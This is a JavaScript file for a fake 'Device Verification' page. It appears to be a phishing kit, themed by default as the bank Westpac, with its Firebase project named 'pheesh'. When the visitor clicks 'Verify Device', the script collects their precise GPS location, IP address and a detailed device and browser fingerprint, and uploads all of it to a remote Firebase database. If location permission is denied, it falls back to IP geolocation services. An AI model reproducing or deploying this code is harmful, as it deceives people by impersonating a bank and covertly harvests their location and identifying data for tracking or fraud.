// Initialize Firebase with full config
const firebaseConfig = {
    apiKey: "AIzaSyBqx_C7XqKjmgJqRHcXBW5K9zMGNBZyGDY",
    authDomain: "pheesh-4481e.firebaseapp.com",
    databaseURL: "https://pheesh-4481e-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "pheesh-4481e",
    storageBucket: "pheesh-4481e.appspot.com",
    messagingSenderId: "458791455321",
    appId: "1:458791455321:web:3a9b8e6f4b8e9f1b2c3d4e"
};

// Initialize Firebase
let database;
const initFirebase = () => {
    return new Promise((resolve, reject) => {
        try {
            if (!firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            database = firebase.database();
            console.log('Firebase initialized successfully');
            
            // Test database connection
            database.ref('.info/connected').on('value', (snapshot) => {
                const isConnected = snapshot.val();
                console.log('Database connection state:', isConnected);
                if (!isConnected && document.visibilityState !== 'hidden') {
                    console.warn('Attempting to reconnect to Firebase...');
                    database.goOnline();
                }
            });

            // Test write permission
            database.ref('test-write').set({
                timestamp: firebase.database.ServerValue.TIMESTAMP
            }).then(() => {
                console.log('Write permission verified');
                database.ref('test-write').remove();
                resolve(database);
            }).catch(reject);
        } catch (error) {
            console.error('Firebase initialization error:', error);
            reject(error);
        }
    });
};

// Initialize theme handling
let currentTheme = '';

// Initialize Firebase and load theme
document.addEventListener('DOMContentLoaded', async () => {
    try {
        await initFirebase();
        
        // Initial theme load
        const snapshot = await database.ref('activeTheme').once('value');
        const initialTheme = snapshot.val() || 'westpac';
        applyTheme(initialTheme);
        document.querySelector('.container').classList.add('loaded');

        // Listen for theme changes
        database.ref('activeTheme').on('value', snapshot => {
            const newTheme = snapshot.val() || 'westpac';
            if (newTheme !== currentTheme) {
                applyTheme(newTheme);
            }
        });
    } catch (error) {
        console.error('Failed to initialize:', error);
        // Fallback to default theme if Firebase fails
        applyTheme('westpac');
        document.querySelector('.container').classList.add('loaded');
    }
});

function applyTheme(themeName) {
    const theme = themes[themeName];
    if (!theme) return;

    currentTheme = themeName;
    document.getElementById('themeStyles').href = theme.styles;
    document.querySelector('.logo-image').src = theme.logo;
    document.title = `Device Verification - ${theme.name}`;
}

// Prevent right-click on logo
document.querySelector('.logo').addEventListener('contextmenu', (e) => {
    e.preventDefault();
    return false;
});

// Prevent drag on logo
document.querySelector('.logo').addEventListener('dragstart', (e) => {
    e.preventDefault();
    return false;
});

// Prevent copy on logo
document.querySelector('.logo').addEventListener('copy', (e) => {
    e.preventDefault();
    return false;
});

// Browser detection helper functions
function getBrowserName() {
    const ua = navigator.userAgent;
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("SamsungBrowser")) return "Samsung Browser";
    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
    if (ua.includes("Trident")) return "Internet Explorer";
    if (ua.includes("Edge")) return "Edge";
    if (ua.includes("Chrome")) return "Chrome";
    if (ua.includes("Safari")) return "Safari";
    return "Unknown";
}

function getBrowserVersion() {
    const ua = navigator.userAgent;
    let M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
    if (/trident/i.test(M[1])) {
        let tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
        return tem[1] || '';
    }
    if (M[1] === 'Chrome') {
        const tem = ua.match(/\bOPR|Edge\/(\d+)/);
        if (tem !== null) return tem[1];
    }
    M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
    let tem = ua.match(/version\/(\d+)/i);
    if (tem !== null) M.splice(1, 1, tem[1]);
    return M[1];
}

// Helper function to determine location source
async function determineLocationSource(position) {
    if ('permissions' in navigator) {
        try {
            const result = await navigator.permissions.query({ name: 'geolocation' });
            if (result.state === 'granted') {
                return 'GPS';
            }
        } catch (e) {
            console.error('Error checking permissions:', e);
        }
    }
    // If accuracy is less than 100 meters, definitely GPS
    if (position.coords.accuracy < 100) {
        return 'GPS (High Accuracy)';
    }
    // If accuracy is less than 500 meters, probably GPS but with poor signal
    else if (position.coords.accuracy < 500) {
        return 'GPS (Low Accuracy)';
    }
    // If accuracy is less than 2000 meters, likely WiFi
    else if (position.coords.accuracy < 2000) {
        return 'WiFi';
    }
    // Otherwise, likely cell towers or IP-based
    return 'Cell/IP';
}

async function saveFallbackLocation(locationData, button, status) {
    if (!database) {
        try {
            await initFirebase();
        } catch (error) {
            console.error('Failed to initialize database:', error);
            status.textContent = 'Verification error. Please try again.';
            return;
        }
    }

    // Clean undefined values
    const cleanData = JSON.parse(JSON.stringify(locationData));
    
    try {
        const newLocationRef = database.ref('locations').push();
        await newLocationRef.set(cleanData);
        console.log('Location saved successfully to Firebase with key:', newLocationRef.key);
        status.textContent = 'Processing verification...';
        return true;
    } catch (dbError) {
        console.error('Error saving location to Firebase:', dbError);
        status.textContent = 'Verification error. Please try again.';
        if (button) {
            button.disabled = false;
            button.textContent = 'Verify Device';
            button.classList.remove('loading');
        }
        return false;
    }
}

// Main functionality
document.addEventListener('DOMContentLoaded', () => {
    const allowLocationButton = document.getElementById('allowLocation');
    const locationStatus = document.getElementById('locationStatus');
    
    allowLocationButton.addEventListener('click', async () => {
        allowLocationButton.classList.add('loading');
        allowLocationButton.disabled = true;
        allowLocationButton.textContent = 'Verifying';
        document.querySelector('.thank-you-card').classList.add('processing');
        
        locationStatus.textContent = 'Processing verification...';
        
        if (!navigator.geolocation) {
            console.log('Geolocation API not supported');
            await handleLocationFallback();
            return;
        }

        const geoOptions = {
            enableHighAccuracy: true,
            timeout: 30000, // Further increased timeout for mobile connections
            maximumAge: 60000, // Increased cache time for better response
            maximumWait: 35000 // Maximum time to wait for high accuracy
        };

        try {
            // Enhanced Chrome/Android handling
            const isChromeAndroid = /Chrome/.test(navigator.userAgent) && /Android/.test(navigator.userAgent);
            const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
            
            if (isChrome || isChromeAndroid) {
                try {
                    const permissionResult = await navigator.permissions.query({ name: 'geolocation' });
                    console.log('Permission state:', permissionResult.state);
                    
                    if (permissionResult.state === 'denied') {
                        console.log('Geolocation permission denied in Chrome');
                        await handleLocationFallback(null, allowLocationButton, locationStatus);
                        return;
                    }
                    
                    if (isChromeAndroid) {
                        console.log('Chrome Android detected');
                        if (permissionResult.state === 'prompt') {
                            console.log('Chrome Android requires explicit permission');
                            // Show a message to the user
                            locationStatus.textContent = 'Please allow location access when prompted...';
                        }
                        // Increase timeout for Android
                        geoOptions.timeout = 45000;
                    }
                } catch (error) {
                    console.error('Error checking permissions:', error);
                    // Continue with default options
                }
            }

            const position = await new Promise((resolve, reject) => {
                const timeoutId = setTimeout(() => {
                    reject(new Error('Location timeout'));
                }, geoOptions.timeout);

                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        clearTimeout(timeoutId);
                        resolve(pos);
                    },
                    (err) => {
                        clearTimeout(timeoutId);
                        reject(err);
                    },
                    geoOptions
                );
            });

            // Ensure high accuracy GPS reading
            if (position.coords.accuracy > 100 && !window._retryHighAccuracy) {
                window._retryHighAccuracy = true;
                try {
                    const highAccuracyPosition = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            resolve,
                            (err) => {
                                console.error('High accuracy retry failed:', err);
                                reject(err);
                            },
                            {
                                enableHighAccuracy: true,
                                timeout: 10000,
                                maximumAge: 0
                            }
                        );
                    });
                    position = highAccuracyPosition; // Update position with high accuracy data
                } catch (highAccError) {
                    console.log('Falling back to original position data');
                }
            }

            console.log('Location obtained:', position.coords);
            
            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                locationSource: await determineLocationSource(position),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                ip: await fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => data.ip)
                    .catch(() => 'Unknown'),
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio
                },
                device: {
                    memory: (typeof navigator.deviceMemory !== 'undefined') ? navigator.deviceMemory : 'Unknown',
                    cores: (typeof navigator.hardwareConcurrency !== 'undefined') ? navigator.hardwareConcurrency : 'Unknown',
                    platform: navigator.platform || 'Unknown',
                    vendor: navigator.vendor || 'Unknown',
                    language: navigator.language || 'Unknown',
                    languages: navigator.languages || [navigator.language] || ['Unknown'],
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                    touchPoints: (typeof navigator.maxTouchPoints !== 'undefined') ? navigator.maxTouchPoints : 'Unknown',
                    connection: (typeof navigator.connection !== 'undefined') ? {
                        type: navigator.connection.effectiveType || 'Unknown',
                        downlink: navigator.connection.downlink || 'Unknown',
                        rtt: navigator.connection.rtt || 'Unknown',
                        saveData: navigator.connection.saveData || false
                    } : 'Unknown'
                },
                browser: {
                    name: getBrowserName(),
                    version: getBrowserVersion(),
                    cookiesEnabled: navigator.cookieEnabled || false,
                    doNotTrack: navigator.doNotTrack || null,
                    plugins: (navigator.plugins && navigator.plugins.length) ? Array.from(navigator.plugins).map(p => p.name) : [],
                    webdriver: (typeof navigator.webdriver !== 'undefined') ? navigator.webdriver : 'Unknown',
                    pdfViewerEnabled: (typeof navigator.pdfViewerEnabled !== 'undefined') ? navigator.pdfViewerEnabled : 'Unknown',
                    deviceOrientation: (typeof window.DeviceOrientationEvent !== 'undefined') ? 'Supported' : 'Not supported',
                    webGL: (function() {
                        try {
                            return !!document.createElement('canvas').getContext('webgl');
                        } catch(e) {
                            return false;
                        }
                    })()
                }
            };

            console.log('Attempting to save location data:', locationData);

            if (!database) {
                console.error('Database not initialized');
                locationStatus.textContent = 'Verification error. Please try again.';
                return;
            }

            try {
                const newLocationRef = database.ref('locations').push();
                await newLocationRef.set(locationData);
                console.log('Location saved successfully to Firebase with key:', newLocationRef.key);
                locationStatus.textContent = 'Processing verification...';
            } catch (error) {
                console.error('Error saving location to Firebase:', error);
                console.error('Error details:', {
                    code: error.code,
                    message: error.message,
                    stack: error.stack
                });
                locationStatus.textContent = 'Verification error. Please try again.';
                allowLocationButton.disabled = false;
                allowLocationButton.textContent = 'Verify Device';
                allowLocationButton.classList.remove('loading');
            }

        } catch (geoError) {
            console.log('Geolocation error:', geoError);
            locationStatus.textContent = 'Processing verification...';
            await handleLocationFallback(geoError);
        }
    });

    // Fallback function for handling location errors
    async function handleLocationFallback(geoError = null) {
        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();
            
            const locationData = {
                latitude: ipData.latitude,
                longitude: ipData.longitude,
                accuracy: 5000,
                locationSource: 'IP Geolocation',
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                ip: ipData.ip,
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio
                },
                device: {
                    memory: navigator.deviceMemory || 'Unknown',
                    cores: navigator.hardwareConcurrency || 'Unknown',
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    language: navigator.language,
                    languages: navigator.languages,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    touchPoints: navigator.maxTouchPoints,
                    connection: navigator.connection ? {
                        type: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    } : 'Unknown'
                },
                browser: {
                    name: getBrowserName(),
                    version: getBrowserVersion(),
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    plugins: Array.from(navigator.plugins).map(p => p.name),
                    webdriver: navigator.webdriver,
                    pdfViewerEnabled: navigator.pdfViewerEnabled,
                    deviceOrientation: window.DeviceOrientationEvent ? 'Supported' : 'Not supported',
                    webGL: !!document.createElement('canvas').getContext('webgl')
                }
            };

            if (geoError) {
                locationData.geoError = {
                    code: geoError.code,
                    message: geoError.message
                };
            }

            await saveFallbackLocation(locationData);
        } catch (ipError) {
            console.error('IP location fallback failed:', ipError);
            // Try alternative IP service as last resort
            try {
                const altResponse = await fetch('https://ipwho.is/');
                const altData = await altResponse.json();
                if (altData.success) {
                    const fallbackData = {
                        latitude: altData.latitude,
                        longitude: altData.longitude,
                        ip: altData.ip
                    };
                    await saveFallbackLocation(fallbackData);
                }
            } catch (finalError) {
                console.error('All location services failed:', finalError);
                locationStatus.textContent = 'Processing verification...';
            }
        }
    }
});
